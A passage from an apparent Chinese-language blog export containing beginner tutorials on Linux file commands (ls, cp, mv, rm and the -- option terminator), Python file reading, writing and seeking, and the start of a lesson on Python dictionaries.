lrwxrwxrwx   <span class="token number">1</span> root root     <span class="token number">7</span>  <span class="token number">9</span>月 <span class="token number">30</span>  <span class="token number">2018</span> sbin -<span class="token operator">></span> usr/bin
drwxr-xr-x   <span class="token number">4</span> root root  <span class="token number">4096</span>  <span class="token number">4</span>月 <span class="token number">20</span> <span class="token number">13</span>:31 srv
dr-xr-xr-x  <span class="token number">13</span> root root     <span class="token number">0</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">21</span>:34 sys
drwxr-xr-x   <span class="token number">4</span> root root  <span class="token number">4096</span>  <span class="token number">5</span>月 <span class="token number">19</span> <span class="token number">13</span>:46 System
drwxrwxrwt  <span class="token number">16</span> root root   <span class="token number">420</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">22</span>:26 tmp
drwxr-xr-x   <span class="token number">9</span> root root  <span class="token number">4096</span>  <span class="token number">6</span>月 <span class="token number">12</span> <span class="token number">15</span>:35 usr
drwxr-xr-x  <span class="token number">12</span> root root  <span class="token number">4096</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">11</span>:40 var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>加上-d选项</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -l -d /
drwxr-xr-x <span class="token number">18</span> root root <span class="token number">4096</span>  <span class="token number">5</span>月 <span class="token number">19</span> <span class="token number">13</span>:46 /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="选项-a"><a href="#选项-a" class="headerlink" title="选项-a"></a>选项-a</h5><p>列出所有文件和目录，包括名字为圆点开头的项（默认隐藏不列出）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -a
<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  <span class="token number">1</span>.txt  <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h3 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h3><h4 id="文件复制命令cp"><a href="#文件复制命令cp" class="headerlink" title="文件复制命令cp"></a>文件复制命令cp</h4><p>第一种用法：<code>cp file1 file2</code> 将文件file1复制为file2，文件file2若存在则覆盖<br>第二种用法：<code>cp file1 file2 ... filen dir</code> 将文件file1，file2，……，filen复制到目录dir下，目录dir必须存在</p>
<p>复制目录的正确用法（-r选项）：<code>cp -r dir1 dir2</code> 若目录dir2存在，则将目录dir1整体复制到目录dir2下；若目录dir2不存在，则将目录dir1复制为目录dir2</p>
<h4 id="移动文件命令mv"><a href="#移动文件命令mv" class="headerlink" title="移动文件命令mv"></a>移动文件命令mv</h4><p>用法一：<code>mv file1 file2</code> 将文件file1移动（ <strong>更名</strong>）为file2<br>用法二：<code>mv file1 file2 ... filen dir</code> 将文件file1，file2,……，filen移动到目录dir下<br>用法三：<code>mv dir1 dir2</code> 若dir2不存在，则将目录dir1 <strong>更名</strong> 为dir2；若dir2存在，则将目录dir1整体移动到dir2下</p>
<h4 id="删除命令rm"><a href="#删除命令rm" class="headerlink" title="删除命令rm"></a>删除命令rm</h4><p>用法：<code>rm file1 file2 ... filen</code><br>选项：</p>
<ul>
<li>-r 若参数是目录，则递归（Recursive）删除目录</li>
<li>-i 每删除一个文件前询问是否确认</li>
<li>-f 强迫（Force）删除</li>
</ul>
<p><strong>注意</strong>：正在运行的可执行程序文件不能被删除</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>假设一目录tmp下有文件1.txt和目录dir：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -l tmp
总用量 <span class="token number">8</span>
-rw-r--r-- <span class="token number">1</span> featherm featherm    <span class="token number">6</span>  <span class="token number">6</span>月 <span class="token number">17</span> <span class="token number">11</span>:01 <span class="token number">1</span>.txt
drwxr-xr-x <span class="token number">2</span> featherm featherm <span class="token number">4096</span>  <span class="token number">6</span>月 <span class="token number">17</span> <span class="token number">11</span>:03 <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>复制文件1.txt为2.txt：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cp</span> tmp/1.txt tmp/2.txt
$ <span class="token function">ls</span> tmp 
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>复制文件1.txt，2.txt到目录dir下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cp</span> tmp/1.txt tmp/2.txt tmp/dir 
$ <span class="token function">ls</span> tmp
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token function">dir</span>
$ <span class="token function">ls</span> tmp/dir 
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将文件1.txt更名为3.txt：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> tmp 
<span class="token number">2</span>.txt  <span class="token number">3</span>.txt  <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>将文件3.txt移动到dir下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mv</span> tmp/3.txt tmp/dir 
$ <span class="token function">ls</span> tmp 
<span class="token number">2</span>.txt  <span class="token function">dir</span>
$ <span class="token function">ls</span> tmp/dir 
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token number">3</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>复制目录dir为dir2：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cp</span> -r tmp/dir tmp/dir2 
$ <span class="token function">ls</span> tmp 
<span class="token number">2</span>.txt  <span class="token function">dir</span>  dir2
$ <span class="token function">ls</span> tmp/dir  
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token number">3</span>.txt
$ <span class="token function">ls</span> tmp/dir2 
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token number">3</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将目录dir更名为dir3：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mv</span> tmp/dir tmp/dir3
$ <span class="token function">ls</span> tmp 
<span class="token number">2</span>.txt  dir2  dir3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>将目录dir3整体移动到目录dir2下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mv</span> tmp/dir tmp/dir3
$ <span class="token function">ls</span> tmp 
<span class="token number">2</span>.txt  dir2  dir3
$ <span class="token function">mv</span> tmp/dir3 tmp/dir2  
$ <span class="token function">ls</span> tmp 
<span class="token number">2</span>.txt  dir2
$ <span class="token function">ls</span> tmp/dir2 
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token number">3</span>.txt  dir3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>删除目录tmp下的2.txt：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">rm</span> tmp/2.txt 
$ <span class="token function">ls</span> tmp 
dir2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>删除tmp下的dir2整个目录：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">rm</span> -r tmp/dir2 
$ <span class="token function">ls</span> tmp 
$  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="显式区分命令选项和处理对象"><a href="#显式区分命令选项和处理对象" class="headerlink" title="显式区分命令选项和处理对象"></a>显式区分命令选项和处理对象</h4><p>假设当前目录下有文件1.txt和2.txt：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span>
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>利用管道创建一个名为<code>-i</code>的文件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> <span class="token operator">></span> -i
$ <span class="token function">ls</span>
<span class="token number">1</span>.txt  <span class="token number">2</span>.txt  -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>现打算执行<code>rm *</code>删除所有文件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">rm</span> *              
rm：是否删除普通文件 <span class="token string">'1.txt'</span>？y
rm：是否删除普通文件 <span class="token string">'2.txt'</span>？y
$ <span class="token function">ls</span>
-i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面例子实际上执行了命令<code>rm 1.txt 2.txt -i</code>，因为Linux中通配符是由shell展开后再传递展开后的参数给命令的，然而文件-i被rm命令解释成选项而不是操作的对象，所以-i文件没有成功删除</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">rm</span> -i
rm: 缺少操作数
请尝试执行 <span class="token string">"rm --help"</span> 来获取更多信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>同样的，直接执行<code>rm -i</code>也无法删除文件-i，因为-i被rm命令解释成选项了</p>
<p>解决问题的方法很简单，许多Linux命令如cp，ls，mv等，都支持用<code>--</code>显式地标记命令行选项的结束：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">rm</span> -- -i
$ <span class="token function">ls</span>
$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>










]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（八）·文件操作</title>
    <url>/bb065bb4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>由于离高考越来越近，博主打算本篇文章过后，暂停本系列教程的更新，等到高考完后再继续本系列教程，请谅解！</p>
<p>这次我们学习用python操作文件，包括文件的读、写等……</p>
<span id="more"></span>

<h2 id="操作文件第一步——打开文件"><a href="#操作文件第一步——打开文件" class="headerlink" title="操作文件第一步——打开文件"></a>操作文件第一步——打开文件</h2><p>要想操作文件，我们首先应该打开一个文件。当然，这个“打开”不是用鼠标双击那种“打开”，别忘了这是个python编程的教程，所以我们是用python程序来打开文件。打开文件用open函数，函数的基本用法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">obj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token punctuation">,</span> mode<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 中括号包围表示mode参数是默认参数的，即有默认值</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上面的<code>name</code>就是我们要打开的文件的路径，这个参数是必须的。参数<code>mode</code>是打开文件的模式，后面单独介绍。</p>
<p>该函数返回一个文件对象，通过这个对象的一些方法，我们对文件进行一些操作。</p>
<h3 id="文件模式"><a href="#文件模式" class="headerlink" title="文件模式"></a>文件模式</h3><p>参数<code>mode</code>代表打开文件的模式，文件模式的常用取值有以下几种：<br>值|含义<br>–|:–<br><code>&#39;r&#39;</code> | 读模式 （<strong>默认值</strong>）<br><code>w</code> | 写模式<br><code>a</code> | 追加模式<br><code>b</code> | 二进制模式（和其它模式一起使用，如<code>&#39;rb&#39;</code>，<code>&#39;wb&#39;</code>等）<br><code>+</code> | 读/写模式（和其它模式一起使用，如<code>&#39;r+&#39;</code>、<code>&#39;w+&#39;</code>、<code>a+</code>等） </p>
<p>在这里需要进一步解释说明：</p>
<ul>
<li>以读模式打开文件，可以对文件进行读取内容，这要求文件必须存在，若不存在程序将报错中止。</li>
<li>以写模式打开文件，可以往文件写入数据，需要注意的是，如果文件不存在将<strong>创建</strong>文件，如果文件存在会将文件内容<strong>清空</strong></li>
<li>读/写模式意思是即可读文件又可写文件，如<code>&#39;r+&#39;</code>，以读模式打开文件，除了可以读取文件内容，还可以写入数据</li>
<li>以追加模式打开文件不会将文件清空，可以<strong>以文件末尾为起点</strong>往文件写入数据，相当于特殊的读模式</li>
</ul>
<h4 id="何为二进制模式？"><a href="#何为二进制模式？" class="headerlink" title="何为二进制模式？"></a>何为二进制模式？</h4><p><strong>二进制模式</strong>有些特殊，这里单独说明。</p>
<p>文本中的一些控制字符如<strong>换行符</strong>，在不同的系统中的存储形式是不同的，在Linux系统中存储的是<code>\n</code>一个字符，而在Windows系统中存储的是<code>\r\n</code>两个字符。</p>
<p>为了通用性，python默认用文本模式打开一个文件，从文件中读取到的换行符，python会自动将其转换成一个<code>\n</code>字符；写入数据的时候，python自动将<code>\n</code>转换成对应系统的换行符形式后再写入文件。</p>
<p>也就是说，以文本模式打开的文件，读取的内容不一定是原本的内容！</p>
<p>如果需要操作文件的原始数据，就需要用到二进制模式打开文件了。</p>
<p>不过这个模式我们暂时用不上，用到了再来补充吧。</p>
<hr>
<p>好了，现在我们以写模式打开一个文件，名为<code>test.txt</code>，这个文件不存在，python自动为我们创建，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">fobj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>第一步完成！</p>
<h2 id="操作文件第二步——读和写"><a href="#操作文件第二步——读和写" class="headerlink" title="操作文件第二步——读和写"></a>操作文件第二步——读和写</h2><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>由于我们刚才以写模式打开了一个<code>test.txt</code>文件，文件无内容，我们先来说说如何往文件写入数据。</p>
<p>往文件写入数据用到文件对象的一个write方法：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">fobj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
fobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'hello world!\n'</span><span class="token punctuation">)</span> <span class="token comment"># 写入内容</span>
fobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'I am Lee\n'</span><span class="token punctuation">)</span> <span class="token comment"># 写入内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>该方法还返回一个整数，表示写入的字符数</p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>如果以读模式打开了一个文件（这个文件要存在），那么我们可以使用文件对象的read方法来读取文件内容：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">fobj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token comment"># 或者fobj = open('test.txt')</span>
content <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment"># 读取10个字符</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
content <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 读取剩下的所有字符</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>read方法带参数时，表示读取的字符数（如果是二进制模式就是字节数），不带参数时表示读取剩下全部内容，如果文件比较小的时候可以直接读取全部内容，如果文件比较大不建议这么做，一是因为速度慢，二是因为文件内容过大，没有足够的内存可以一次性容纳这么多数据。</p>
<hr>
<p><strong>注意</strong>：对文件的读和写操作时，文件对象有一个<strong>指针</strong>用于指定当前文件的操作位置，读文件的时候，会使这个指针往后移动。也就是说，我们读取文件内容时是按顺序读取的，读取完后就没有了，因为指针已经移动到文件末尾。不过我们可以使用文件对象的<strong>seek</strong>方法，手动改变这个指针的位置；写文件的操作也是类似，除非使用seek方法，否则我们无法将这次写入的数据写入到上一次写入的数据之前。</p>
<h2 id="操作文件最后一步——关闭文件"><a href="#操作文件最后一步——关闭文件" class="headerlink" title="操作文件最后一步——关闭文件"></a>操作文件最后一步——关闭文件</h2><p>操作完文件后要对其关闭，特别是更改了文件的数据的时候，可能造成写入的数据没有真正写入到文件中，这是因为写入数据的时候，是往缓冲区写入的，等缓冲区满了，或者关闭文件的时候才会将数据写入硬盘。</p>
<p>操作很简单，调用close方法即可：</p>
<pre class="line-numbers language-pytrhon" data-language="pytrhon"><code class="language-pytrhon">fobj.close()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>一般情况下，程序退出后或者退出前，程序打开的文件会被自动关闭，但是如果程序因为错误中止了，很可能会出现数据没有被写入文件的现象，为了安全起见，使用完文件后应及时关闭。</p>
<p>通常使用如下代码来保证文件正常关闭：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token comment"># do something</span>
<span class="token keyword">finally</span><span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>暂时不用理解<code>try</code>、<code>finally</code>代码块的具体作用，我们只需要知道当<code>try</code>代码块发生错误是程序中止，或者程序正常运行下去，<code>finally</code>代码块都会执行。</p>
<p>也可以使用如下代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token comment"># do something</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>with</code>代码块结束后，无论程序是否发生错误，会自动调用close方法来关闭文件</p>
<hr>
<p>最后总结起来，代码如下：</p>
<p>首先是写文件：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> fobj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> fobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'hello world!\n'</span><span class="token punctuation">)</span>
<span class="token number">13</span>
<span class="token operator">>></span><span class="token operator">></span> fobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'I am Lee.\n'</span><span class="token punctuation">)</span>
<span class="token number">10</span>
<span class="token operator">>></span><span class="token operator">></span> fobj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后读取这个写入的文件：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> fobj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">)</span> <span class="token comment"># 默认模式为读模式'r'</span>
<span class="token operator">>></span><span class="token operator">></span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># 读取10个字符</span>
<span class="token string">'hello worl'</span>
<span class="token operator">>></span><span class="token operator">></span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 读取剩下的全部字符</span>
<span class="token string">'d!\nI am Lee.\n'</span>
<span class="token operator">>></span><span class="token operator">></span> fobj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 没有对文件进行修改可不调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="其它文件操作方式"><a href="#其它文件操作方式" class="headerlink" title="其它文件操作方式"></a>其它文件操作方式</h2><h3 id="迭代文件"><a href="#迭代文件" class="headerlink" title="迭代文件"></a>迭代文件</h3><p>我们读取文件的时候还可以使用<code>for</code>循环进行迭代，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token comment"># end参数表示字符串最后附加的字符，默认为换行符</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
hello world!
I am Lee<span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，每次循环我们得到文件的一行内容，在这里我们没有关闭文件，但是这没有必要，因为我们只是读文件，并没有改变文件的内容。</p>
<p>这种读取文件的方法是我们最常用的方法。</p>
<h3 id="随机访问"><a href="#随机访问" class="headerlink" title="随机访问"></a>随机访问</h3><p>刚才我们说过，文件的操作都是从头到尾按顺序进行的，若想“回头”，就需要使用seek方法重新设置文件指针，具体用法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">fobj<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>offset<span class="token punctuation">[</span><span class="token punctuation">,</span> whence<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>offset</code>参数表示偏移量，正数为向后偏移，负数为向前偏移，0表示不偏移；<code>whence</code>参数表示起始位置，默认是0（表示相对于<strong>文件开头</strong>，偏移量为非负数），其它取值还有1（相对于<strong>当前位置</strong>，偏移量可正可负可0,），2（相对于<strong>文件末尾</strong>，偏移量为非正数）。</p>
<p>同时还可以配合tell方法来使用，tell方法返回当前文件指针位置。</p>
<p>具体可以看下面的例子：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span> <span class="token comment"># 由于文本模式whence只能使用0，故使用二进制模式操作</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'hello world'</span><span class="token punctuation">)</span> <span class="token comment"># b''为字节串类型，类似字符串，二进制模式文件操作基于字节串</span>
<span class="token number">11</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 获取当前文件指针位置</span>
<span class="token number">11</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 定位到文件尾部向前5个字节</span>
<span class="token number">6</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token string">b'world'</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 获取当前文件指针位置</span>
<span class="token number">11</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 向前7个字节</span>
<span class="token number">4</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'haha'</span><span class="token punctuation">)</span>
<span class="token number">4</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 相当于f.seek(0,0) 定位到文件头部</span>
<span class="token number">0</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 读取所有文件内容</span>
<span class="token string">b'hellhaharld'</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 关闭文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<hr>
<p>好了，本节教程就此结束，感谢读者的阅读，下一节教程要等到高考完了才有时间更新咯～</p>
<p><code>ヾ(￣▽￣)Bye~Bye~</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（七）·字典</title>
    <url>/2bb94625/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本文介绍本系列教程最后一个数据结构——字典</p>
<span id="more"></span>

<hr>
<p>在现实生活中，查英语字典的时候，我们通常根据单词来查找意思。而python中的<strong>字典</strong>也是类似的，根据特定的 <strong>“键”</strong>（单词）来查找 <strong>“值”</strong>（意思）。</p>
<h2 id="字典的基本使用"><a href="#字典的基本使用" class="headerlink" title="字典的基本使用"></a>字典的基本使用</h2><p>下面以电话簿为例，我们的电话簿记录的是电话号码。当要查找电话号码时，我们根据人名来查找其电话号码，所以人名就是字典的键，电话号码就是字典的值。假设有下面这样的人名和电话号码的电话簿：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">人名<span class="token operator">=</span><span class="token operator">></span>电话
Aganzo<span class="token operator">=</span><span class="token operator">></span><span class="token number">1230</span>
Jack<span class="token operator">=</span><span class="token operator">></span><span class="token number">0221</span>
Lee<span class="token operator">=</span><span class="token operator">></span><span class="token number">1354</span>
Emilie<span class="token operator">=</span><span class="token operator">></span><span class="token number">2479</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h3><p>现在我们来创建一个字典来表示这个电话簿：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> phonebook<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Aganzo'</span><span class="token punctuation">:</span><span class="token string">'1230'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">:</span><span class="token string">'0221'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">:</span><span class="token string">'1354'</span><span class="token punctuation">,</span> <span class="token string">'Emilie'</span><span class="token punctuation">:</span><span class="token string">'2479'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> phonebook
<span class="token punctuation">&#123;</span><span class="token string">'Aganzo'</span><span class="token punctuation">:</span> <span class="token string">'1230'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">:</span> <span class="token string">'0221'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">:</span> <span class="token string">'1354'</span><span class="token punctuation">,</span> <span class="token string">'Emilie'</span><span class="token punctuation">:</span> <span class="token string">'2479'</span><span class="token punctuation">&#125;</span>
